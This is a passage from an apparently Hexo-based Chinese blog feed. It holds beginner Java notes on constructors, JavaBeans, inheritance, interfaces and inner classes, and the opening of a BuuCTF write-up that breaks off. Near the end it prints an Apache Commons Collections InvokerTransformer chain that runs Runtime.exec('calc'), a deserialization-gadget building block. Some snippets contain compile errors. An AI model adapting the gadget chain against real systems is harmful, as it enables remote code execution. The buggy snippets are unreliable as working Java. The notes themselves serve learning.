<br>&#125;<br></code></pre></td></tr></table></figure><p>懒得打字了。。直接贴图片了</p><p><img src="/img/javalearn47.png" alt="javalearn47"></p><p>空参构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;芜湖！我是空参构造&quot;</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">//结果会输出 芜湖！我是空参构造</span><br></code></pre></td></tr></table></figure><p>当然，我们也可以利用有参构造在创建对象的时候就给成员变量赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//修改girlwhat为如下：</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;芜湖！我是空参构造&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">girlwhat</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>            <span class="hljs-built_in">this</span>.age = age;<br>            System.out.println(<span class="hljs-string">&quot;你使用了有参构造&quot;</span>);<br>        &#125;<br><span class="hljs-comment">//testgirl:</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>(<span class="hljs-string">&quot;txy&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(hername2.getName());<br>        System.out.println(hername2.getAge());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br>芜湖！我是空参构造<br>你使用了有参构造<br>txy<br><span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure><p>构造方法注意事项：</p><ul><li><p>如果没有定义构造方法，系统将会给出一个默认的无参数构造方法。</p></li><li><p>如果定义了构造方法，系统将不再提供默认的构造方法。(比如你已经定义了一个有参构造，此时再调用无参构造系统就会报错)。</p></li><li><p>构造方法的重载：带参构造方法和无参构造方法，两者方法名相同但参数不同，这叫构造方法的重载。</p></li><li><p>推荐使用方式：无论是否使用，都手动书写两种构造方法。</p></li></ul><p>总结：</p><ul><li>构造方法的作用？初始化成员变量。</li><li>构造方法有几种？作用？两种，有参构造和无参构造。</li><li>构造方法有哪些注意事项？写的时候两种构造都要写好。</li></ul><h4 id="标准JavaBean"><a href="#标准JavaBean" class="headerlink" title="标准JavaBean"></a>标准JavaBean</h4><p><img src="/img/javalearn48.png" alt="javalearn48"></p><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//beanbean</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">beanbean</span> &#123;<br>     <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String passwd;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">beanbean</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//无参构造</span><br>        System.out.println(<span class="hljs-string">&quot;我是无参构造！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">beanbean</span><span class="hljs-params">(String name, String email, <span class="hljs-type">int</span> age, String passwd)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.email = email;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.passwd = passwd;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEmail</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.email = email;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPasswd</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.passwd = passwd;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPasswd</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> passwd;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//beanwhat</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">beanwhat</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">beanbean</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">beanbean</span>();<br>        <span class="hljs-type">beanbean</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">beanbean</span>(<span class="hljs-string">&quot;txy&quot;</span>, <span class="hljs-string">&quot;q@q&quot;</span>, <span class="hljs-number">22</span>, <span class="hljs-string">&quot;shit&quot;</span>);<br><br>        System.out.println(b2.getName());<br>        System.out.println(b2.getAge());<br>        System.out.println(b2.getEmail());<br>        System.out.println(b2.getPasswd());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>快捷生成有参或无参构造：<code>alt + insert</code>选择<code>construct</code>。也能通过选<code>getandset</code>去快速生成方法。</p><p>或者通过<code>PTG</code>插件，写完属性直接右键点击就好。</p><p>p87 java内存介绍</p><h4 id="基本数据类型和引用数据类型"><a href="#基本数据类型和引用数据类型" class="headerlink" title="基本数据类型和引用数据类型"></a>基本数据类型和引用数据类型</h4><p>之前的记忆：</p><p><img src="/img/javalearn49.png" alt="javalearn49"></p><p>从内存的角度去理解：</p><p><img src="/img/javalearn50.png" alt="javalearn50"></p><h4 id="this的内存原理"><a href="#this的内存原理" class="headerlink" title="this的内存原理"></a>this的内存原理</h4><p>p89</p><h4 id="成员变量和局部变量的区别"><a href="#成员变量和局部变量的区别" class="headerlink" title="成员变量和局部变量的区别"></a>成员变量和局部变量的区别</h4><ul><li>成员变量：类中方法外的变量</li><li>局部变量：方法中的变量</li></ul><h4 id="面向对象综合练习"><a href="#面向对象综合练习" class="headerlink" title="面向对象综合练习"></a>面向对象综合练习</h4><ul><li>文字版格斗游戏</li></ul><p>P91-P95</p><p>P124：</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="封装-1"><a href="#封装-1" class="headerlink" title="封装"></a>封装</h4><p>对象代表什么，就得封装相应的数据，并提供数据对应的行为。</p><p><img src="/img/javalearn51.png" alt="javalearn51"></p><ul><li>Java中提供一个关键字extends，用这个关键字可以让一个类和李谷一各类建立起继承关系。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;&#125;<br></code></pre></td></tr></table></figure><ul><li>Student成为子类(派生类)，Person成为父类(基类或者超类)。</li></ul><h4 id="使用继承的好处："><a href="#使用继承的好处：" class="headerlink" title="使用继承的好处："></a>使用继承的好处：</h4><ul><li>可以把多个子类中重复的代码抽取到父类中，提高代码的复用性。</li><li>子类可以在父类的基础上，增加其他的功能，使子类更加强大。</li></ul><p><img src="/img/javalearn52.png" alt="javalearn52"></p><p>继承的特点：</p><p>Java只支持单继承，不支持多继承，但支持多层继承。</p><p>单继承：一个子类只能及成果一个父类。</p><p>不支持多继承：子类不能同时继承多个父类。</p><p>多层继承：子类A继承父类B，父类B可以再继承父类C。</p><p>每个类都直接或者间接的继承于Object。</p><p>需注意子类只能访问父类中非私有的成员。</p><p>P126-128</p><p>P129</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//学生形态</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br><span class="hljs-comment">//人的形态</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>但这东西有什么用？</p><p><img src="/img/javalearn55.png" alt="javalearn55"></p><h4 id="什么是多态？"><a href="#什么是多态？" class="headerlink" title="什么是多态？"></a>什么是多态？</h4><p>同类型的对象，表现出的不同形态。</p><h4 id="多态的表现形式"><a href="#多态的表现形式" class="headerlink" title="多态的表现形式"></a>多态的表现形式</h4><p>父类类型 对象名称 &#x3D; 子类对象。</p><h4 id="多态的前提"><a href="#多态的前提" class="headerlink" title="多态的前提"></a>多态的前提</h4><p>有继承&#x2F;实现关系；</p><p>有父类引用指向子类对象( <code>Fu f = new Zi();</code>)</p><p>有方法重写。</p><p>如果某方法接收的参数是一个父类，那么可以给他传所有父类下的子类对象。</p><p><img src="/img/javalearn56.png" alt="javalearn56"></p><p>P131&#x3D;132</p><h4 id="包和final"><a href="#包和final" class="headerlink" title="包和final"></a>包和final</h4><p><img src="/img/javalearn57.png" alt="javalearn57"></p><p><img src="/img/javalearn58.png" alt="javalearn58"></p><p>导包：</p><p><img src="/img/javalearn59.png" alt="javalearn59"></p><p><img src="/img/javalearn60.png" alt="javalearn60"></p><p><img src="/img/javalearn61.png" alt="javalearn61"></p><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><ul><li>修饰方法：表明该方法是最终方法，不能被重写。</li><li>类：表明该类是最终类，不能被继承。</li><li>变量：叫做常量，只能被赋值一次。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fu</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;父类的show方法&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Zi</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fu</span>&#123;<span class="hljs-comment">//这里会报错</span><br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;子类的show方法&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//修饰变量：</span><br><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn62.png" alt="javalearn62"></p><h4 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h4><ul><li>权限修饰符：是用来控制一个成员能够被访问的范围的。</li><li>可以修饰成员变量，方法，构造方法，内部类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn63.png" alt="javalearn63"></p><p><img src="/img/javalearn65.png" alt="javalearn65"></p><p>P134 代码块未看</p><h4 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h4><p><img src="/img/javalearn66.png" alt="javalearn66"></p><p><img src="/img/javalearn67.png" alt="javalearn67"></p><p><img src="/img/javalearn68.png" alt="javalearn68"></p><ul><li>工具类：</li></ul><p>帮助我们做一些事情的，但是不描述任何事物的类。</p><ul><li>JavaBean类：</li></ul><p>用来描述一类事物的类，比如，student,teacher,dog,cat等。</p><ul><li>测试类</li></ul><p>用来检查其他类是否书写正确，带有main方法的类，是程序的入口。</p><p><img src="/img/javalearn69.png" alt="javalearn69"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayUtil</span> &#123;<br>    <span class="hljs-comment">//私有化构造方法，目的：不让外界创建它的对象</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ArrayUtil</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-comment">//需要定义为静态的，方便调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String xxxxxx<br>&#125;<br><span class="hljs-comment">//调用时：</span><br>String ??? = ArrayUtil.方法名(参数)<br></code></pre></td></tr></table></figure><p>P123未看</p><h3 id="P135-抽象类"><a href="#P135-抽象类" class="headerlink" title="P135 抽象类"></a>P135 抽象类</h3><ul><li><p>抽象方法：将共性的行为(方法)抽取到父类之后，由于每一个子类执行的内容是不一样的，苏哦一在父类中不能确定具体的方法体，该方法即课定义为抽象方法。</p></li><li><p>抽象类：如果一个类中存在抽象方法，那么必须声明为抽象类。</p></li><li><p>抽象方法的子类强制重写，不重写就报错。</p></li><li><p>定义格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> 返回值类型 方法名(参数列表);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> classs 类名&#123;&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn70.png" alt="javalearn70"></p></li></ul><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p> 为什么要存在接口？</p><p><img src="/img/javalearn71.png" alt="javalearn71"></p><p>接口是一种规则，是对行为的抽象。</p><p><img src="/img/jaaallearn72.png" alt="jaaallearn72"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Frog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Swim</span>&#123;<br>    <span class="hljs-meta">@override</span><br>&#125;<br></code></pre></td></tr></table></figure><p>接口中成员的特点：</p><ul><li>成员变量</li></ul><p>只能是常量</p><p>默认修饰符： public static final</p><ul><li>构造方法</li></ul><p>没有</p><ul><li>成员方法</li></ul><p>只能是抽象方法</p><p>默认修饰符： public abstract</p><p>接口和类之间的关系</p><ul><li>类和类的关系</li></ul><p>继承关系，只能单继承不能多继承，但可以多层继承。</p><ul><li>类和接口的关系</li></ul><p>实现关系，可以但实现，也可以多实现，还可以在继承一个类的同时实现多个接口。</p><ul><li>接口和接口的关系</li></ul><p>继承关系，可以单继承也可以多继承。</p><h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h3><p>类的五大成员：</p><p>属性，方法，构造方法，代码块，内部类。</p><p>在一个类的里面，再定义一个类。</p><p>e.g:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span>&#123;<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么要学习内部类？</p><p>需求：写一个javabean类描述汽车。</p><p>属性：品牌，车龄，颜色，发动机品牌，使用年限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//似乎可以这么写：</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>    .........<br>&#125;<br></code></pre></td></tr></table></figure><p>单实际上，发动机算是个独立的个体：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    .........<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Engine</span>&#123;<br> String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>&#125;<br></code></pre></td></tr></table></figure><p>但实际上发动机这东西要依赖车存在，所以可以依靠内部类实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123; <span class="hljs-comment">//外部类</span><br>    String carName;<br>    <span class="hljs-type">int</span> carAge;<br>    <br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Engine</span>&#123;<span class="hljs-comment">//内部类，外部类的一部分，内部类单独出现没任何意义</span><br>        String engineName;<br>    <span class="hljs-type">int</span> engineAge;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>内部类的访问特点：</p><ul><li>内部类可以直接访问外部类的成员，包括私有</li><li>外部类要访问内部类的成员，必须创建对象</li></ul><p>P192 泛型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer; <span class="hljs-comment">// 导入 Apache Commons Collections 中的 Transformer 类</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer; <span class="hljs-comment">// 导入 Apache Commons Collections 中的 InvokerTransformer 类</span><br><span class="hljs-keyword">import</span> org.omg.SendingContext.RunTime; <span class="hljs-comment">// 导入错误的 RunTime 类，应该是 java.lang.Runtime</span><br><span class="hljs-keyword">import</span> java.lang.reflect.Method; <span class="hljs-comment">// 导入 Java 反射中的 Method 类</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建一个调用 getMethod 方法的 InvokerTransformer 对象，参数是 String.class 和 Class[].class</span><br>        <span class="hljs-comment">// 第三个参数是方法名称 &quot;getRuntime&quot;，因此这个 InvokerTransformer 的目的是获取 Runtime 类中名为 getRuntime 的方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <br>        <span class="hljs-comment">// 创建一个调用 invoke 方法的 InvokerTransformer 对象，参数是 Object.class 和 Object[].class</span><br>        <span class="hljs-comment">// 第三个参数是 &#123;null, null&#125;，即对应 invoke 方法的参数列表为 &#123;null, null&#125;</span><br>        <span class="hljs-comment">// 这个 InvokerTransformer 的目的是调用 getRuntimeMethod 对象的 invoke 方法</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><br>        <span class="hljs-comment">// 创建一个调用 exec 方法的 InvokerTransformer 对象，参数是 String.class</span><br>        <span class="hljs-comment">// 第三个参数是 &quot;calc&quot;，即要执行的命令为 &quot;calc&quot;，这个 InvokerTransformer 的目的是执行计算器程序</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Obj</span>  ect[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_8</title>
    <link href="/2023/12/28/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_8/"/>
    <url>/2023/12/28/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_8/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>源码泄露，存在<code>www.zip</code>，下载得到<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 